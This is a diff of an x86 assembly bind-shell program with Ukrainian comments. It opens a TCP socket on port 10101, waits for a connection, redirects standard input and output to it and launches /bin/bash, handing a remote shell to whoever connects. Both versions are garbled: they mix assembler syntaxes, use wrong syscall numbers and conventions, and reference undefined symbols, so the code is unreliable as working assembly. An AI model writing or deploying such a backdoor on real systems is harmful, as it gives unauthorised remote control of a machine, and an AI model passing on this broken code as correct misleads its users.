@@ -1,85 +1,91 @@
+; Оголошення секцій
 .data
-sin:
-    .zero 16          # резервуємо місце для структури sockaddr_in
+sock: .space 4  ; Дескриптор сокета
+fd: .space 4    ; Дескриптор файлу
+sin: .space 16  ; Структура sockaddr_in
 
-port:
-    .word 0x7527      # htons(10101)
-
-sockfd:
-    .long 0           # оголошуємо змінну для сокету
-
-fd:
-    .long 0           # оголошуємо змінну для файлового дескриптору
-
-bash:
-    .asciz "/bin/bash" # шлях до програми /bin/bash
+; Оголошення констант
+.equ AF_INET, 2
+.equ PORT, 10101
+.equ SYS_SOCKET, 102
+.equ SYS_BIND, 100
+.equ SYS_LISTEN, 103
+.equ SYS_ACCEPT, 106
+.equ SYS_DUP2, 93
+.equ SYS_EXECVE, 11
+.equ STDIN, 0
+.equ STDOUT, 1
+.equ STDERR, 2
 
 .text
-.globl _start
-_start:
-    # Відкриття TCP-сокету
-    mov $0x29, %eax      # syscall number for socket (socketcall)
-    xor %edi, %edi       # clear edi register (socketcall subfunction for socket)
-    xor %esi, %esi       # clear esi register (AF_INET)
-    xor %edx, %edx       # clear edx register (IPPROTO_TCP)
+; Головна функція
+main:
+    ; Створення TCP-сокета
+    push SYS_SOCKET
+    mov eax, AF_INET
+    mov ebx, SOCK_STREAM
+    mov ecx, IPPROTO_TCP
     syscall
 
-    mov %eax, sockfd     # зберігаємо результат в змінну sockfd
+    ; Збереження дескриптора сокета
+    mov [sock], eax
 
-    # Заповнення структури sockaddr_in
-    mov $AF_INET, %ax    # sin_family = AF_INET
-    mov %ax, sin(%rip)   # зберігаємо AF_INET у структурі
-    mov port(%rip), %ax  # sin_port = htons(PORT)
-    xchg %al, %ah        # htons(), AH ⇔ AL
-    mov %ax, 2(sin)      # зберігаємо htons(PORT) у структурі
+    ; Заповнення структури sockaddr_in
+    movw AF_INET, [sin + sin_family]
+    movw PORT, eax
+    xchgb %ah, %al
+    movw %ax, [sin + sin_port]
 
-    # Виклик bind()
-    mov $0x31, %eax      # syscall number for bind (socketcall)
-    mov sockfd(%rip), %edi # передаємо сокетний дескриптор у реєстр EDI
-    lea sin(%rip), %rsi  # передаємо адресу структури sockaddr_in у реєстр RSI
-    mov $16, %edx        # передаємо sizeof(struct sockaddr_in) у реєстр EDX
+    ; Прив'язка сокета до адреси
+    push SYS_BIND
+    mov rdi, [sock]
+    mov rsi, sin
+    mov rdx, sizeof(sin)
     syscall
 
-    # Виклик listen()
-    mov $0x32, %eax      # syscall number for listen (socketcall)
-    mov sockfd(%rip), %edi # передаємо сокетний дескриптор у реєстр EDI
-    mov $1, %esi         # передаємо 1 у реєстр ESI (кількість сеансів, які будуть дозволені)
+    ; Встановлення режиму прослуховування
+    push SYS_LISTEN
+    mov rdi, [sock]
+    mov rsi, 1
     syscall
 
-    # Виклик accept()
-    mov $0x2b, %eax      # syscall number for accept (socketcall)
-    mov sockfd(%rip), %edi # передаємо сокетний дескриптор у реєстр EDI
-    xor %esi, %esi       # передаємо NULL у реєстр ESI
-    xor %edx, %edx       # передаємо NULL у реєстр EDX
+    ; Прийняття вхідного з'єднання
+    push SYS_ACCEPT
+    mov rdi, [sock]
+    mov rsi, NULL
+    mov rdx, NULL
     syscall
 
-    mov %eax, fd(%rip)   # зберігаємо результат у файловому дескрипторі fd
+    ; Збереження дескриптора файлу
+    mov [fd], eax
 
-    # Перенаправлення стандартних потоків на сокет
-    mov $0x21, %eax      # syscall number for dup2 (два рази)
-    mov fd(%rip), %edi   # передаємо файловий дескриптор у реєстр EDI
-    xor %esi, %esi       # передаємо stdin (0) у реєстр ESI
+    ; Дублювання дескриптора файлу для stdin
+    push SYS_DUP2
+    mov rdi, [fd]
+    mov rsi, STDIN
     syscall
 
-    mov $0x21, %eax      # syscall number for dup2 (три рази)
-    mov fd(%rip), %edi   # передаємо файловий дескриптор у реєстр EDI
-    mov %edi, %esi       # передаємо stdout (1) у реєстр ESI
+    ; Дублювання дескриптора файлу для stdout
+    push SYS_DUP2
+    mov rdi, [fd]
+    mov rsi, STDOUT
     syscall
 
-    mov $0x21, %eax      # syscall number for dup2 (чотири рази)
-    mov fd(%rip), %edi   # передаємо файловий дескриптор у реєстр EDI
-    mov %edi, %esi       # передаємо stderr (2) у реєстр ESI
+    ; Дублювання дескриптора файлу для stderr
+    push SYS_DUP2
+    mov rdi, [fd]
+    mov rsi, STDERR
     syscall
 
-    # Запуск програми /bin/bash
-    mov $0x3b, %eax      # syscall number for execve
-    lea bash(%rip), %rdi # передаємо адресу шляху до програми /bin/bash у реєстр RDI
-    xor %rsi, %rsi       # передаємо NULL у реєстр RSI
-    xor %rdx, %rdx       # передаємо NULL у реєстр RDX
+    ; Запуск /bin/bash
+    mov rdi, bash
+    xor rsi, rsi
+    xor rdx, rdx
+    push SYS_EXECVE
     syscall
 
-    # Вихід з програми
-    xor %edi, %edi       # передаємо 0 у реєстр EDI (код виходу)
-    mov $0x3c, %eax      # syscall number for exit
-    syscall
+    ; Вихід з програми
+    mov eax, 60
+    xor ebx, ebx
+    int 80h
 
